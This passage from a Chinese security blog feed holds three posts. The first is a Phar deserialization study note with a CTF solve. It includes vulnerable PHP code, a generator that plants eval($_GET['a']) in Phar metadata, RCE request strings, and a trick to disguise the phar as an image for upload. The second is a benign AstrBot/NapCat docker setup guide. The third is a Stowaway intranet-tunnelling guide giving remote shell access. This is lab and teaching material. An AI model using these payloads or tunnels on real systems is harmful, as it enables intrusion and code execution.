alt="image-20250421175611356"></p><p>第二个是可以生成<code>phar</code>文件的页面<code>phar.php</code>，源码如下</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175706263.png" alt="image-20250421175706263"></p><p><strong>审计代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Testobj</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span>=<span class="hljs-string">&quot;echo &#x27;ok&#x27;;&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;output);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ul><li>在漏洞页面<code>index.php</code>的源码中，定义了<code>Testobj</code>这个类，有一个属性<code>output</code>，和一个<code>__destruct()</code>魔术方法，会执行<code>output</code>的内容，这里可以进行RCE执行命令</li><li>然后是可以GET传参<code>filename</code>，并且使用了<code>file_exists()</code>函数检查文件或目录是否存在，这个函数存在与受影响的函数之中，所以这里存在<code>phar</code>反序列化漏洞</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Testobj</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment"># 删除之前的test.par文件(如果有)</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 创建一个phar对象，文件名必须以 .phar 为后缀</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 开始写文件</span><br><span class="hljs-comment"># 调用startBuffering()这个函数意味着后续的写入操作不会立即将数据写入文件，而是先存储在缓冲区中，直到调用stopBuffering()方法</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-comment"># 写入stub（是 Phar 文件的入口点，当 Phar 文件被执行时，首先会执行 stub 中的代码）</span><br><span class="hljs-comment"># 括号中的代码是默认的，是一个特殊的 PHP 指令，用于停止 PHP 代码的编译，后面的数据会被当作二进制数据处理</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><span class="hljs-comment"># 创建一个 Testobj 类的对象 $o</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-comment"># 设置output属性的内容</span><br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><span class="hljs-comment"># 调用 setMetadata 方法，将 $o 对象作为元数据写入 Phar 文件中（写入meta-data）</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment"># 将字符串 &quot;test&quot; 作为文件内容，以 test.txt 为文件名添加到 Phar 压缩包中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment"># 停止写入文件</span><br><span class="hljs-comment"># 调用 stopBuffering 方法，停止缓冲，并将缓冲区中的数据写入到 test.phar 文件中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>在<code>phar.php</code>页面可以生成<code>.phar</code>文件，源码中同样定义了<code>Testobj</code>类和<code>output</code>属性，与<code>index.php</code>中的一致</li><li>生成<code>.phar</code>文件部分的解析见源码</li></ul><p>在<code>index.php</code>页面中传入GET参数<code>filename</code>，其值为<code>/etc/passwd</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ilename=<span class="hljs-regexp">/etc/passwd</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421181801644.png" alt="image-20250421181801644"></p><p>正常会根据文件是否存在得到一个布尔值的回显</p><p>因为这里使用的是<code>file_exists</code>函数，是可以使用<code>phar://</code>伪协议的，但是可以使用<code>phar</code>伪协议并不代表一定存在<code>phar</code>反序列化漏洞，还要看能否触发魔术方法进而可以执行一些操作，在这里就是要触发<code>__destruct()</code>这个魔术方法进而可以执行命令，所以存在漏洞</p><p>访问<code>phar.php</code>这个页面，然后这个页面中的代码会自动生成一个<code>test.phar</code>的文件，查看<code>tmp</code>目录下会发现生成了这个文件</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184245937.png" alt="image-20250421184245937"></p><p>可以使用<code>xxd</code>命令查看文件内容</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184338480.png" alt="image-20250421184338480"></p><p>可以看到写入了序列化后的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Testobj&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;output&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;eval(<span class="hljs-subst">$_GET</span>[&quot;</span>a<span class="hljs-string">&quot;]);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>接着在<code>index.php</code>页面中查看这个文件发现是存在的</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">filename</span>=test.phar<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421183120702.png" alt="image-20250421183120702"></p><p>最后就可以利用<code>phar</code>伪协议读取这个文件，会自动将序列化部分的数据进行反序列化，然后就会自动触发<code>__destruct()</code>魔术方法，从而可以执行<code>eval($_GET[&quot;a&quot;]);</code>，也就是可以进行GET传参一个<code>a</code>进行RCE</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">filename</span>=phar://test.phar<span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184732520.png" alt="image-20250421184732520"></p><h1 id="Phar反序列化漏洞使用条件"><a href="#Phar反序列化漏洞使用条件" class="headerlink" title="Phar反序列化漏洞使用条件"></a><code>Phar</code>反序列化漏洞使用条件</h1><ul><li><code>phar</code>文件可以上传到服务器端</li><li>要有可用反序列化魔术方法作为跳板（就是可以通过触发魔术方法<code>__destruct()</code>或<code>__wakeup()</code>进行RCE之类的操作）</li><li>要有文件操作函数，如：<code>file_exists()</code>，<code>fopen()</code>，<code>file_get_contents()</code></li><li>文件操作函数的参数可控</li><li>要使用的伪协议<code>phar://</code>中的字符和关键字没有被过滤</li></ul><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421191301040.png" alt="image-20250421191301040"></p><h2 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h2><p><strong>使用<code>phar://</code>伪协议读取文件是不看后缀的</strong></p><p>如果服务器对上传的文件有限制，只能上传一些<code>png</code>、<code>jpg</code>、<code>gif</code>等图片文件，我们可以把<code>phar</code>文件修改成其他的任何一个格式的文件，并且不会受到影响</p><p>如下，使用<code>mv</code>命令将<code>test.phar</code>文件修改成<code>test.png</code>文件，改变其后缀名</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421185913907.png" alt="image-20250421185913907"></p><p>然后使用<code>phar</code>伪协议读取<code>test.png</code>文件仍然是可以执行命令的</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">filename</span>=phar://test.png<span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421190111156.png" alt="image-20250421190111156"></p><p>所以后缀名是没有影响的，只要可以上传到服务器就行</p><h1 id="Phar反序列化例题"><a href="#Phar反序列化例题" class="headerlink" title="Phar反序列化例题"></a><code>Phar</code>反序列化例题</h1><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><code>index.php</code>页面源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>可以发现定义了一个<code>TestObject()</code>类，存在一个<code>__destruct()</code>魔术方法可以获取<code>flag.php</code>中的flag，然后可以进行传参一个POST参数<code>file</code>，并使用<code>md5_file</code> 函数读取指定文件的内容，并基于这些内容生成哈希值，提示有一个<code>upload.php</code>页面，访问发现可以上传文件，并且根据标题可知只能上传图片文件</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421191439247.png" alt="image-20250421191439247"></p><p>这里使用<code>md5_file</code> 函数读取指定文件，并且有上传文件的接口，存在<code>phar</code>反序列化漏洞，可以通过上传一个<code>phar</code>文件，并在<code>index.php</code>页面通过POST参数<code>file</code>读取文件，从而进行反序列化触发<code>__destruct()</code>魔术方法获取flag，不过指定了上传的文件只能是图片，但是在前面学习的小知识中可知可以将<code>phar</code>文件后缀改成其他的，并且不受影响，所以可以上传一个图片格式并可以被解析</p><p>首先可以先试试POST传参file查看文件</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">file</span><span class="hljs-operator">=/</span>etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421192916940.png" alt="image-20250421192916940"></p><p>可以看到可以读取到<code>/etc/passwd</code>文件并输出一段哈希值</p><p>这题中满足了以下条件，可以进行<code>phar</code>反序列化的利用<img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421194052111.png" alt="image-20250421194052111"></p><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a><strong>解题步骤</strong></h3><ul><li>**生成一个<code>phar</code>文件：**在<code>mate-data</code>里放置一个包含<code>TestObject()</code>序列化字符串</li><li><strong>上传文件：</strong><code>md5_file</code>执行伪协议，触发反序列化，从而触发<code>__destruct()</code>魔术方法执行<code>echo flag</code></li></ul><h3 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h3><p><strong>生成一个<code>phar</code>文件</strong></p><p>可以在自己本地的<code>PhpStorm</code>中生成一个<code>phar</code>文件，不过注意要设置<code>PhpStorm</code>中的<code>phar.readonly</code>为<code>Off</code>，否则会出现以下报错</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421194809962.png" alt="image-20250421194809962"></p><p>找到当前使用的php版本的<code>php.ini</code>文件</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421195235055.png" alt="image-20250421195235055"></p><p>直接搜索找到<code>phar.readonly</code>就行，以下是原本的样子</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200406776.png" alt="image-20250421200406776"></p><p>把<code>On</code>修改为<code>Off</code>，还要把前面的分号去掉，修改后如下</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200456451.png" alt="image-20250421200456451"></p><p>然后直接运行以下脚本就可以在脚本的同一目录下生成<code>phar</code>文件了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200642878.png" alt="image-20250421200642878"></p><p>然后就是在<code>upload.php</code>页面上传文件，抓包改后缀和MIME头就行</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421201143536.png" alt="image-20250421201143536"></p><p>可以看到成功上传进去了</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421201248601.png" alt="image-20250421201248601"></p><p>最后就是使用<code>phar</code>伪协议读取上传的文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file=phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>class23<span class="hljs-regexp">/upload/</span>test.png<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421205949427.png" alt="image-20250421205949427"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞笔记</category>
      
      <category>PHP反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Phar反序列化 学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Ubuntu云服务器部署AstrBot</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/</url>
    
    <content type="html"><![CDATA[<p>官方文档：<a href="https://astrbot.app/deploy/astrbot/docker.html">https://astrbot.app/deploy/astrbot/docker.html</a></p><h1 id="使用docker部署AstrBot"><a href="#使用docker部署AstrBot" class="headerlink" title="使用docker部署AstrBot"></a>使用docker部署AstrBot</h1><p>创建目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> astrbot<br></code></pre></td></tr></table></figure><p>docker部署</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run -itd -p 6180-6200:6180-6200 -p 11451:11451 -v <span class="hljs-variable">$PWD</span>/data:/AstrBot/data -v /etc/localtime:/etc/localtime:ro -v /etc/timezone:/etc/timezone:ro --name astrbot soulter/astrbot:latest<br></code></pre></td></tr></table></figure><p>查看日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker logs -f astrbot<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424122523476.png" alt="image-20250424122523476"></p><h1 id="使用NapCat部署消息平台"><a href="#使用NapCat部署消息平台" class="headerlink" title="使用NapCat部署消息平台"></a>使用NapCat部署消息平台</h1><h2 id="通过docker一键部署"><a href="#通过docker一键部署" class="headerlink" title="通过docker一键部署"></a>通过docker一键部署</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -d \<br>-e NAPCAT_GID=$(<span class="hljs-built_in">id</span> -g) \<br>-e NAPCAT_UID=$(<span class="hljs-built_in">id</span> -u) \<br>-p 3000:3000 \<br>-p 3001:3001 \<br>-p 6099:6099 \<br>--name napcat \<br>--restart=always \<br>mlikiowa/napcat-docker:latest<br></code></pre></td></tr></table></figure><p>查看日志获取登录二维码和管理面板的URL，QQ扫码登录就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker logs napcat<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424123753911.png" alt="image-20250424123753911"></p><p>默认密码是napcat，记得修改密码</p><h2 id="连接到AstrBot"><a href="#连接到AstrBot" class="headerlink" title="连接到AstrBot"></a>连接到AstrBot</h2><p>进入部署好的进入 AstrBot 的管理面板，添加适配器</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424122732999.png" alt="image-20250424122732999"></p><p>ID随便填，启用要勾选，下面俩默认</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424122922656.png" alt="image-20250424122922656"></p><p>配置管理员，填写你的 QQ 号（不是机器人的 QQ 号），切记点击右下角 <code>保存</code>，AstrBot 重启并会应用配置</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424123013994.png" alt="image-20250424123013994"></p><h3 id="在-NapCatQQ-中添加-WebSocket-客户端"><a href="#在-NapCatQQ-中添加-WebSocket-客户端" class="headerlink" title="在 NapCatQQ 中添加 WebSocket 客户端"></a>在 NapCatQQ 中添加 WebSocket 客户端</h3><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424124357313.png" alt="image-20250424124357313"></p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424124724178.png" alt="image-20250424124724178"></p><ul><li>启用勾选</li><li>名称随便填</li><li>URL填<code>ws://宿主机IP:端口/ws</code></li><li>消息格式为Array</li><li>Token就是密码</li><li>下面俩间隔都为5000</li></ul><p>看到以下就是配置好了</p><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/image-20250424124812691.png" alt="image-20250424124812691"></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网代理</title>
    <link href="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/"/>
    <url>/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h1><h2 id="安装配置stowaway"><a href="#安装配置stowaway" class="headerlink" title="安装配置stowaway"></a>安装配置stowaway</h2><p>Stowaway下载地址：<a href="https://github.com/ph4ntonn/Stowaway/releases">https://github.com/ph4ntonn/Stowaway/releases</a></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402231515350.png" alt="image-20250402231515350"></p><p>我使用的云服务器Ubuntu作为admin，自己的主机作为agent，所以选择上面这俩</p><p>把<code>linux_x64_admin</code>放在自己的VPS上</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232141778.png" alt="image-20250402232141778"></p><p><code>windows_x64_agent.exe</code>就放在自己主机里</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232241256.png" alt="image-20250402232241256"></p><p>命令如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">在admin上：./linux_x64_admin -l <span class="hljs-tag">&lt;<span class="hljs-name">端口号</span>&gt;</span><br>在agent上：./windows_x64_agent.exe -c <span class="hljs-tag">&lt;<span class="hljs-name">admin的IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">admin的端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在这里的命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">在admin上：./linux_x64_admin -l 9999<br>在agent上：./windows_x64_agent.exe -c 47.122.75.126:9999<br></code></pre></td></tr></table></figure><p>可能在admin机上执行命令时会出现以下权限报错</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232706627.png" alt="image-20250402232706627"></p><p>这时只要输入以下命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x linux_x64_admin<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232840262.png" alt="image-20250402232840262"></p><p>然后在自己主机上输入命令，注意要在<code>Windows PowerShell</code>里输入命令</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402233520977.png" alt="image-20250402233520977"></p><p>然后就会发现vps上多出了<code>(admin) &gt;&gt;</code>，这就是成功连上了</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402233622733.png" alt="image-20250402233622733"></p><p>然后输入<code>help</code>或者<code>h</code>就可以查看命令</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402233812557.png" alt="image-20250402233812557"></p><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>help</td><td>显示帮助信息、命令</td></tr><tr><td>detail</td><td>显示已连接节点的信息</td></tr><tr><td>topo</td><td>显示节点的拓扑结构，直观了解各节点间的连接关系、布局等情况</td></tr><tr><td>use <id></td><td>用来选择用户想要使用的目标节点</td></tr><tr><td>exit</td><td>用于退出程序</td></tr></tbody></table><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402234326936.png" alt="image-20250402234326936"></p><p>这里<code>detail</code>展示连接节点的信息，然后使用命令<code>use 0</code>选择连这个主机，可以一次连接多个，如果有多个就<code>use &lt;id&gt;</code>，<code>id</code>就是前面的<code>Node[id]</code></p><p>连上后输入<code>help</code>命令，主要用<code>socks</code></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402234947008.png" alt="image-20250402234947008"></p><p>比如输入<code>shell</code>就拿到连接的主机权限，可以执行命令，如<code>ipconfig</code>查看<code>IP</code></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402235411194.png" alt="image-20250402235411194"></p><p>虽然有乱码但是无伤大雅，只要输入命令改为<code>utf-8</code>就行了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 